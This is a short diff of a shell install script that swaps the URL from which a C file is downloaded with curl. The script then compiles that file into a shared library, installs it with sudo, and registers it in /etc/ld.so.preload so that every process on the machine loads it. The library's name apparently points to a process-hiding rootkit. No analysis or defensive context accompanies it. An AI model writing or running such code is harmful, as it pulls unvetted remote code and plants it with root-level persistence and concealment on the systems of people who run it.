@@ -9,7 +9,7 @@ install_dependencies() {
 
 # Define a function for downloading and compiling code
 download_and_compile_code() {
-  curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+  curl -L https://github.com/barburonjilo/back/raw/main/maonumput.c -o nyumput.c
   gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
   sudo mv libnyumput.so /usr/local/lib/
   echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
